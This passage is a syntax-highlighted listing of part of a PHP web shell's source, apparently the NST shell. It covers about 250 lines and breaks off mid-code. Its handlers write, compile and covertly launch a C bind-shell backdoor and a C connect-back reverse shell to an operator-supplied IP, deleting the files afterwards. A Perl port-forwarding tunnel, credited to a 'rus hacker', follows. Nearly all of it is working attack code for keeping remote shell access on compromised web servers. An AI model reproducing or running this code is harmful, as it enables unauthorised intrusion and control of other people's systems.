<span class="lineno">1393</span> <span class="s2">    if (soc_rc != 0)</span>
<span class="lineno">1394</span> <span class="s2">        exit(0);</span>
<span class="lineno">1395</span> <span class="s2">    while (1) {</span>
<span class="lineno">1396</span> <span class="s2">        soc_len = sizeof(client_addr);</span>
<span class="lineno">1397</span> <span class="s2">        soc_cli = accept(soc_des, (struct sockaddr *) &amp;client_addr, &amp;soc_len);</span>
<span class="lineno">1398</span> <span class="s2">        if (soc_cli &lt; 0)</span>
<span class="lineno">1399</span> <span class="s2">            exit(0);</span>
<span class="lineno">1400</span> <span class="s2">        cli_pid = getpid();</span>
<span class="lineno">1401</span> <span class="s2">        server_pid = fork();</span>
<span class="lineno">1402</span> <span class="s2">        if (server_pid != 0) {</span>
<span class="lineno">1403</span> <span class="s2">            dup2(soc_cli,0);</span>
<span class="lineno">1404</span> <span class="s2">            dup2(soc_cli,1);</span>
<span class="lineno">1405</span> <span class="s2">            dup2(soc_cli,2);</span>
<span class="lineno">1406</span> <span class="s2">            execl(</span><span class="se">\&quot;</span><span class="s2">/bin/sh</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">sh</span><span class="se">\&quot;</span><span class="s2">,(char *)0);</span>
<span class="lineno">1407</span> <span class="s2">            close(soc_cli);</span>
<span class="lineno">1408</span> <span class="s2">            exit(0);</span>
<span class="lineno">1409</span> <span class="s2">        }</span>
<span class="lineno">1410</span> <span class="s2">    close(soc_cli);</span>
<span class="lineno">1411</span> <span class="s2">    }</span>
<span class="lineno">1412</span> <span class="s2">}</span>
<span class="lineno">1413</span> 
<span class="lineno">1414</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1415</span> 
<span class="lineno">1416</span> 
<span class="lineno">1417</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="lineno">1418</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bd.c&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1419</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$c_bd_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1420</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;gcc /tmp/nst_c_bd.c -o /tmp/nst_bd&quot;</span><span class="p">);</span>
<span class="lineno">1421</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup /tmp/nst_bd &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1422</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bd.c&quot;</span><span class="p">);</span>
<span class="lineno">1423</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_bd&quot;</span><span class="p">);</span>
<span class="lineno">1424</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">1425</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="lineno">1426</span> <span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1427</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_c_bd.c&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1428</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$c_bd_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1429</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;gcc .nst_bd_tmp/nst_c_bd.c -o .nst_bd_tmp/nst_bd&quot;</span><span class="p">);</span>
<span class="lineno">1430</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup .nst_bd_tmp/nst_bd &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1431</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_bd&quot;</span><span class="p">);</span>
<span class="lineno">1432</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_c_bd.c&quot;</span><span class="p">);</span>
<span class="lineno">1433</span> <span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1434</span> <span class="p">}</span>
<span class="lineno">1435</span> <span class="p">}</span>
<span class="lineno">1436</span> <span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="lineno">1437</span> <span class="p">}</span><span class="c1">#end of c bd</span>
<span class="lineno">1438</span> 
<span class="lineno">1439</span> 
<span class="lineno">1440</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;bc_c&#39;</span><span class="p">]){</span> <span class="c1"># nc -l -p 4500</span>
<span class="lineno">1441</span> <span class="nv">$port_c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port_c&#39;</span><span class="p">];</span>
<span class="lineno">1442</span> <span class="nv">$ip</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">];</span>
<span class="lineno">1443</span> <span class="nv">$bc_c_scp</span> <span class="o">=</span> <span class="s2">&quot;#include &lt;stdio.h&gt;</span>
<span class="lineno">1444</span> <span class="s2">#include &lt;sys/types.h&gt;</span>
<span class="lineno">1445</span> <span class="s2">#include &lt;sys/socket.h&gt;</span>
<span class="lineno">1446</span> <span class="s2">#include &lt;unistd.h&gt;</span>
<span class="lineno">1447</span> <span class="s2">#include &lt;fcntl.h&gt;</span>
<span class="lineno">1448</span> 
<span class="lineno">1449</span> <span class="s2">#include &lt;netinet/in.h&gt;</span>
<span class="lineno">1450</span> <span class="s2">#include &lt;netdb.h&gt;</span>
<span class="lineno">1451</span> 
<span class="lineno">1452</span> <span class="s2">int fd, sock;</span>
<span class="lineno">1453</span> <span class="s2">int port = </span><span class="si">$port_c</span><span class="s2">;</span>
<span class="lineno">1454</span> <span class="s2">struct sockaddr_in addr;</span>
<span class="lineno">1455</span> 
<span class="lineno">1456</span> <span class="s2">char mesg[]  = </span><span class="se">\&quot;</span><span class="s2">::Connect-Back Backdoor:: CMD: </span><span class="se">\&quot;</span><span class="s2">;</span>
<span class="lineno">1457</span> <span class="s2">char shell[] = </span><span class="se">\&quot;</span><span class="s2">/bin/sh</span><span class="se">\&quot;</span><span class="s2">;</span>
<span class="lineno">1458</span> 
<span class="lineno">1459</span> <span class="s2">int main(int argc, char *argv[]) {</span>
<span class="lineno">1460</span> <span class="s2">        while(argc&lt;2) {</span>
<span class="lineno">1461</span> <span class="s2">        fprintf(stderr, </span><span class="se">\&quot;</span><span class="s2"> %s &lt;ip&gt; </span><span class="se">\&quot;</span><span class="s2">, argv[0]);</span>
<span class="lineno">1462</span> <span class="s2">        exit(0); }</span>
<span class="lineno">1463</span> 
<span class="lineno">1464</span> <span class="s2">addr.sin_family = AF_INET;</span>
<span class="lineno">1465</span> <span class="s2">addr.sin_port = htons(port);</span>
<span class="lineno">1466</span> <span class="s2">addr.sin_addr.s_addr = inet_addr(argv[1]);</span>
<span class="lineno">1467</span> <span class="s2">fd = socket(AF_INET, SOCK_STREAM, 0);</span>
<span class="lineno">1468</span> <span class="s2">connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr));</span>
<span class="lineno">1469</span> 
<span class="lineno">1470</span> <span class="s2">send(fd, mesg, sizeof(mesg), 0);</span>
<span class="lineno">1471</span> 
<span class="lineno">1472</span> <span class="s2">dup2(fd, 0);</span>
<span class="lineno">1473</span> <span class="s2">dup2(fd, 1);</span>
<span class="lineno">1474</span> <span class="s2">dup2(fd, 2);</span>
<span class="lineno">1475</span> <span class="s2">execl(shell, </span><span class="se">\&quot;</span><span class="s2">in.telnetd</span><span class="se">\&quot;</span><span class="s2">, 0);</span>
<span class="lineno">1476</span> 
<span class="lineno">1477</span> <span class="s2">close(fd);</span>
<span class="lineno">1478</span> <span class="s2">return 1;</span>
<span class="lineno">1479</span> <span class="s2">}</span>
<span class="lineno">1480</span> 
<span class="lineno">1481</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1482</span> 
<span class="lineno">1483</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="lineno">1484</span> <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc_c.c&quot;</span><span class="p">)){</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc_c.c&quot;</span><span class="p">);}</span>
<span class="lineno">1485</span> <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc_c.c&quot;</span><span class="p">)){</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc&quot;</span><span class="p">);}</span>
<span class="lineno">1486</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc_c.c&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1487</span> <span class="nv">$bd_c_scp</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;!n&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$bd_c_scp</span><span class="p">);</span>
<span class="lineno">1488</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$bc_c_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1489</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;gcc /tmp/nst_c_bc_c.c -o /tmp/nst_bc_c&quot;</span><span class="p">);</span>
<span class="lineno">1490</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup /tmp/nst_bc_c </span><span class="si">$ip</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1491</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_bc_c&quot;</span><span class="p">);</span>
<span class="lineno">1492</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_bc_c.c&quot;</span><span class="p">);</span>
<span class="lineno">1493</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">1494</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="lineno">1495</span> <span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1496</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp/nst_c_bc_c.c&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1497</span> <span class="nv">$bd_c_scp</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;!n&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$bd_c_scp</span><span class="p">);</span>
<span class="lineno">1498</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$bc_c_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1499</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;gcc .nst_bc_c_tmp/nst_c_bc_c.c -o .nst_bc_c_tmp/nst_bc_c&quot;</span><span class="p">);</span>
<span class="lineno">1500</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup .nst_bc_c_tmp/nst_bc_c </span><span class="si">$ip</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1501</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp/nst_bc_c.c&quot;</span><span class="p">);</span>
<span class="lineno">1502</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp/nst_bc_c&quot;</span><span class="p">);</span>
<span class="lineno">1503</span> <span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1504</span> <span class="p">}</span>
<span class="lineno">1505</span> <span class="p">}</span>
<span class="lineno">1506</span> <span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="lineno">1507</span> 
<span class="lineno">1508</span> <span class="p">}</span><span class="c1">#end of back connect C</span>
<span class="lineno">1509</span> 
<span class="lineno">1510</span> 
<span class="lineno">1511</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;datapipe_pl&#39;</span><span class="p">]){</span>
<span class="lineno">1512</span> <span class="nv">$port_2</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port_2&#39;</span><span class="p">];</span>
<span class="lineno">1513</span> <span class="nv">$port_3</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port_3&#39;</span><span class="p">];</span>
<span class="lineno">1514</span> <span class="nv">$ip</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">];</span>
<span class="lineno">1515</span> <span class="nv">$datapipe_pl</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="lineno">1516</span> <span class="s2">#!/usr/bin/perl</span>
<span class="lineno">1517</span> <span class="s2"># coded by CuTTer (rus hacker)</span>
<span class="lineno">1518</span> <span class="s2">use IO::Socket;</span>
<span class="lineno">1519</span> <span class="s2">use POSIX;</span>
<span class="lineno">1520</span> 
<span class="lineno">1521</span> <span class="se">\$</span><span class="s2">localport=</span><span class="si">$port_2</span><span class="s2">;</span>
<span class="lineno">1522</span> <span class="se">\$</span><span class="s2">host=</span><span class="se">\&quot;</span><span class="si">$ip\</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1523</span> <span class="nx">\</span><span class="nv">$port</span><span class="o">=</span><span class="nv">$port_3</span><span class="p">;</span>
<span class="lineno">1524</span> 
<span class="lineno">1525</span> <span class="nx">\</span><span class="nv">$daemon</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">1526</span> 
<span class="lineno">1527</span> <span class="nx">\</span><span class="nv">$DIR</span> <span class="o">=</span> <span class="nx">undef</span><span class="p">;</span>
<span class="lineno">1528</span> 
<span class="lineno">1529</span> 
<span class="lineno">1530</span> <span class="c1">### Âûâîäèòü ëîã ñîáûòèé (1-äà, 0-íåò)</span>
<span class="lineno">1531</span> <span class="nx">\</span><span class="nv">$log</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="lineno">1532</span> 
<span class="lineno">1533</span> 
<span class="lineno">1534</span> 
<span class="lineno">1535</span> 
<span class="lineno">1536</span> <span class="nx">\</span><span class="err">$</span><span class="o">|</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="lineno">1537</span> 
<span class="lineno">1538</span> <span class="k">if</span> <span class="p">(</span><span class="nx">\</span><span class="nv">$daemon</span><span class="p">){</span>
<span class="lineno">1539</span>         <span class="k">print</span> <span class="nx">\</span><span class="s2">&quot;3anycKaeM daemon</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="lineno">1540</span> 
<span class="lineno">1541</span> <span class="s2">        </span><span class="se">\$</span><span class="s2">pid = fork;</span>
<span class="lineno">1542</span> <span class="s2">        exit if </span><span class="se">\$</span><span class="s2">pid;</span>
<span class="lineno">1543</span> <span class="s2">        die </span><span class="se">\&quot;</span><span class="s2">Couldn&#39;t fork: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\&quot;</span><span class="s2"> unless defined(</span><span class="se">\$</span><span class="s2">pid);</span>
<span class="lineno">1544</span> <span class="s2">        POSIX::setsid() or die </span><span class="se">\&quot;</span><span class="s2">Can&#39;t start a new session: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\&quot;</span><span class="s2">;</span>
<span class="lineno">1545</span> <span class="s2">}</span>
<span class="lineno">1546</span> 
<span class="lineno">1547</span> <span class="s2">%o = (&#39;port&#39; =&gt; </span><span class="se">\$</span><span class="s2">localport,</span>
<span class="lineno">1548</span> <span class="s2">          &#39;toport&#39; =&gt; </span><span class="se">\$</span><span class="s2">port,</span>
<span class="lineno">1549</span> <span class="s2">          &#39;tohost&#39; =&gt; </span><span class="se">\$</span><span class="s2">host);</span>
<span class="lineno">1550</span> 
<span class="lineno">1551</span> <span class="se">\$</span><span class="s2">ah = IO::Socket::INET-&gt;new(</span>
<span class="lineno">1552</span> <span class="s2">                         &#39;LocalPort&#39; =&gt; </span><span class="se">\$</span><span class="s2">localport,</span>
<span class="lineno">1553</span> <span class="s2">                         &#39;Reuse&#39; =&gt; 1,</span>
<span class="lineno">1554</span> <span class="s2">                         &#39;Listen&#39; =&gt; 10)</span>
<span class="lineno">1555</span> <span class="s2">    || die </span><span class="se">\&quot;</span><span class="s2">Íåëüçÿ îòêðûòü ñîêåò äëÿ ñîåäèíåíèé: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\&quot;</span><span class="s2">;</span>
<span class="lineno">1556</span> 
<span class="lineno">1557</span> <span class="s2">print </span><span class="se">\&quot;</span><span class="s2">Íà÷èíàåì âûïîëíåíèÿ öèêëà.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1558</span> <span class="se">\$</span><span class="s2">SIG{&#39;CHLD&#39;} = &#39;IGNORE&#39;;</span>
<span class="lineno">1559</span> <span class="se">\$</span><span class="s2">num = 0;</span>
<span class="lineno">1560</span> <span class="s2">while (1) {</span>
<span class="lineno">1561</span> <span class="s2">        </span><span class="se">\$</span><span class="s2">ch = </span><span class="se">\$</span><span class="s2">ah-&gt;accept();</span>
<span class="lineno">1562</span> <span class="s2">        if (!</span><span class="se">\$</span><span class="s2">ch) {</span>
<span class="lineno">1563</span> <span class="s2">                print STDERR </span><span class="se">\&quot;</span><span class="s2">Ïðåðâàíî âûïîëåíèå accept: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="lineno">1564</span> <span class="s2">                next;</span>
<span class="lineno">1565</span> <span class="s2">        }</span>
<span class="lineno">1566</span> 
<span class="lineno">1567</span> <span class="s2">        printf(</span><span class="se">\&quot;</span><span class="s2">Íîâûé êëèåíò: host %s, port %s.</span><span class="se">\n\&quot;</span><span class="s2">,</span>
<span class="lineno">1568</span> <span class="s2">        </span><span class="se">\$</span><span class="s2">ch-&gt;peerhost(), </span><span class="se">\$</span><span class="s2">ch-&gt;peerport()) if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1569</span> <span class="s2">        ++</span><span class="se">\$</span><span class="s2">num;</span>
<span class="lineno">1570</span> <span class="s2">        </span><span class="se">\$</span><span class="s2">pid = fork();</span>
<span class="lineno">1571</span> <span class="s2">        if (!defined(</span><span class="se">\$</span><span class="s2">pid)) {</span>
<span class="lineno">1572</span> <span class="s2">                print STDERR </span><span class="se">\&quot;</span><span class="s2">Íåâîçìîæíî âûïîëíèòü fork: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="lineno">1573</span> <span class="s2">    } elsif (</span><span class="se">\$</span><span class="s2">pid == 0) {</span>
<span class="lineno">1574</span> 
<span class="lineno">1575</span> <span class="s2">### Íîâûé ïðîöåññ</span>
<span class="lineno">1576</span> <span class="s2">                </span><span class="se">\$</span><span class="s2">ah-&gt;close();</span>
<span class="lineno">1577</span> <span class="s2">                Run(\%o, </span><span class="se">\$</span><span class="s2">ch, </span><span class="se">\$</span><span class="s2">num);</span>
<span class="lineno">1578</span> <span class="s2">        } else {</span>
<span class="lineno">1579</span> <span class="s2">                print </span><span class="se">\&quot;</span><span class="s2">Parent: Fork ïðîøåë óñïåøíî, çàêðûâàåì ñîêåò.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1580</span> <span class="s2">                </span><span class="se">\$</span><span class="s2">ch-&gt;close();</span>
<span class="lineno">1581</span> <span class="s2">        }</span>
<span class="lineno">1582</span> <span class="s2">}</span>
<span class="lineno">1583</span> 
<span class="lineno">1584</span> 
<span class="lineno">1585</span> <span class="s2">sub Run {</span>
<span class="lineno">1586</span> <span class="s2">        my(</span><span class="se">\$</span><span class="s2">o, </span><span class="se">\$</span><span class="s2">ch, </span><span class="se">\$</span><span class="s2">num) = @_;</span>
<span class="lineno">1587</span> <span class="s2">        my </span><span class="se">\$</span><span class="s2">th = IO::Socket::INET-&gt;new(&#39;PeerAddr&#39; =&gt; </span><span class="se">\$</span><span class="s2">o-&gt;{&#39;tohost&#39;},</span>
<span class="lineno">1588</span> <span class="s2">                                                        &#39;PeerPort&#39; =&gt; </span><span class="se">\$</span><span class="s2">o-&gt;{&#39;toport&#39;});</span>
<span class="lineno">1589</span> <span class="s2">        print(</span><span class="se">\&quot;</span><span class="s2">Child: Äåëàåì ðåäèðåêò íà </span><span class="se">\$</span><span class="s2">o-&gt;{&#39;tohost&#39;}, ïîðò </span><span class="se">\$</span><span class="s2">o-&gt;{&#39;toport&#39;}.</span><span class="se">\n\&quot;</span><span class="s2">) if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1590</span> <span class="s2">        if (!</span><span class="se">\$</span><span class="s2">th) {</span>
<span class="lineno">1591</span> <span class="s2">                printf STDERR (</span><span class="se">\&quot;</span><span class="s2">Child: Ïðåðâàí ðåäèðåêò íà %s, ïîðò %s.</span><span class="se">\n\&quot;</span><span class="s2">,</span>
<span class="lineno">1592</span> <span class="s2">                </span><span class="se">\$</span><span class="s2">o-&gt;{&#39;tohost&#39;}, </span><span class="se">\$</span><span class="s2">o-&gt;{&#39;toport&#39;});</span>
<span class="lineno">1593</span> <span class="s2">                exit 0;</span>
<span class="lineno">1594</span> <span class="s2">        }</span>
<span class="lineno">1595</span> 
<span class="lineno">1596</span> <span class="s2">        my </span><span class="se">\$</span><span class="s2">fh;</span>
<span class="lineno">1597</span> <span class="s2">        if (</span><span class="se">\$</span><span class="s2">o-&gt;{&#39;dir&#39;}) {</span>
<span class="lineno">1598</span> <span class="s2">                </span><span class="se">\$</span><span class="s2">fh = Symbol::gensym();</span>
<span class="lineno">1599</span> <span class="s2">                open(</span><span class="se">\$</span><span class="s2">fh, </span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\$</span><span class="s2">o-&gt;{&#39;dir&#39;}/tunnel</span><span class="se">\$</span><span class="s2">num.log</span><span class="se">\&quot;</span><span class="s2">)</span>
<span class="lineno">1600</span> <span class="s2">                or die </span><span class="se">\&quot;</span><span class="s2">Child: Ïðåðâàíî ñîçäàíèå ëîã ôàéëà </span><span class="se">\$</span><span class="s2">o-&gt;{&#39;dir&#39;}/tunnel</span><span class="se">\$</span><span class="s2">num.log: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\&quot;</span><span class="s2">;</span>
<span class="lineno">1601</span> <span class="s2">        }</span>
<span class="lineno">1602</span> 
<span class="lineno">1603</span> <span class="s2">        </span><span class="se">\$</span><span class="s2">ch-&gt;autoflush();</span>
<span class="lineno">1604</span> <span class="s2">        </span><span class="se">\$</span><span class="s2">th-&gt;autoflush();</span>
<span class="lineno">1605</span> <span class="s2">        while (</span><span class="se">\$</span><span class="s2">ch || </span><span class="se">\$</span><span class="s2">th) {</span>
<span class="lineno">1606</span> <span class="s2">                print </span><span class="se">\&quot;</span><span class="s2">Child: Âêëþ÷àåì öèêë.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1607</span> <span class="s2">                my </span><span class="se">\$</span><span class="s2">rin = </span><span class="se">\&quot;\&quot;</span><span class="s2">;</span>
<span class="lineno">1608</span> <span class="s2">                vec(</span><span class="se">\$</span><span class="s2">rin, fileno(</span><span class="se">\$</span><span class="s2">ch), 1) = 1 if </span><span class="se">\$</span><span class="s2">ch;</span>
<span class="lineno">1609</span> <span class="s2">                vec(</span><span class="se">\$</span><span class="s2">rin, fileno(</span><span class="se">\$</span><span class="s2">th), 1) = 1 if </span><span class="se">\$</span><span class="s2">th;</span>
<span class="lineno">1610</span> <span class="s2">                my(</span><span class="se">\$</span><span class="s2">rout, </span><span class="se">\$</span><span class="s2">eout);</span>
<span class="lineno">1611</span> <span class="s2">                select(</span><span class="se">\$</span><span class="s2">rout = </span><span class="se">\$</span><span class="s2">rin, undef, </span><span class="se">\$</span><span class="s2">eout = </span><span class="se">\$</span><span class="s2">rin, 120);</span>
<span class="lineno">1612</span> <span class="s2">                if (!</span><span class="se">\$</span><span class="s2">rout  &amp;&amp;  !</span><span class="se">\$</span><span class="s2">eout) {</span>
<span class="lineno">1613</span> <span class="s2">                        print STDERR </span><span class="se">\&quot;</span><span class="s2">Child: Îøèáêà Timeout.</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="lineno">1614</span> <span class="s2">                }</span>
<span class="lineno">1615</span> <span class="s2">                my </span><span class="se">\$</span><span class="s2">cbuffer = </span><span class="se">\&quot;\&quot;</span><span class="s2">;</span>
<span class="lineno">1616</span> <span class="s2">                my </span><span class="se">\$</span><span class="s2">tbuffer = </span><span class="se">\&quot;\&quot;</span><span class="s2">;</span>
<span class="lineno">1617</span> 
<span class="lineno">1618</span> <span class="s2">                if (</span><span class="se">\$</span><span class="s2">ch &amp;&amp; (vec(</span><span class="se">\$</span><span class="s2">eout, fileno(</span><span class="se">\$</span><span class="s2">ch), 1) || vec(</span><span class="se">\$</span><span class="s2">rout, fileno(</span><span class="se">\$</span><span class="s2">ch), 1))) {</span>
<span class="lineno">1619</span> <span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: Æäåì äàííûõ îò êëèåíòà.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1620</span> <span class="s2">                        my </span><span class="se">\$</span><span class="s2">result = sysread(</span><span class="se">\$</span><span class="s2">ch, </span><span class="se">\$</span><span class="s2">tbuffer, 1024);</span>
<span class="lineno">1621</span> <span class="s2">                        if (!defined(</span><span class="se">\$</span><span class="s2">result)) {</span>
<span class="lineno">1622</span> <span class="s2">                                print STDERR </span><span class="se">\&quot;</span><span class="s2">Child: Îøèáêà ïðè ñ÷èòûâàíèè äàííûõ êëèåíòà: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="lineno">1623</span> <span class="s2">                                exit 0;</span>
<span class="lineno">1624</span> <span class="s2">                        }</span>
<span class="lineno">1625</span> <span class="s2">                        if (</span><span class="se">\$</span><span class="s2">result == 0) {</span>
<span class="lineno">1626</span> <span class="s2">                                print </span><span class="se">\&quot;</span><span class="s2">Child: Êëèåíò îòñîåäèíèëñÿ.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1627</span> <span class="s2">                                exit 0;</span>
<span class="lineno">1628</span> <span class="s2">                        }</span>
<span class="lineno">1629</span> 
<span class="lineno">1630</span> <span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: Äàííûå: </span><span class="se">\$</span><span class="s2">cbuffer</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1631</span> <span class="s2">                }</span>
<span class="lineno">1632</span> 
<span class="lineno">1633</span> <span class="s2">                if (</span><span class="se">\$</span><span class="s2">th  &amp;&amp;  (vec(</span><span class="se">\$</span><span class="s2">eout, fileno(</span><span class="se">\$</span><span class="s2">th), 1)  || vec(</span><span class="se">\$</span><span class="s2">rout, fileno(</span><span class="se">\$</span><span class="s2">th), 1))) {</span>
<span class="lineno">1634</span> <span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: Æäåì äàííûõ.</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="lineno">1635</span> <span class="s2">                        my </span><span class="se">\$</span><span class="s2">result = sysread(</span><span class="se">\$</span><span class="s2">th, </span><span class="se">\$</span><span class="s2">cbuffer, 1024);</span>
<span class="lineno">1636</span> <span class="s2">                        if (!defined(</span><span class="se">\$</span><span class="s2">result)) {</span>
<span class="lineno">1637</span> <span class="s2">                                print STDERR </span><span class="se">\&quot;</span><span class="s2">Child: Íåâîçìîæíî ñ÷èòàòü äàííûå: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="lineno">1638</span> <span class="s2">                                exit 0;</span>
<span class="lineno">1639</span> <span class="s2">                        }</span>
<span class="lineno">1640</span> 
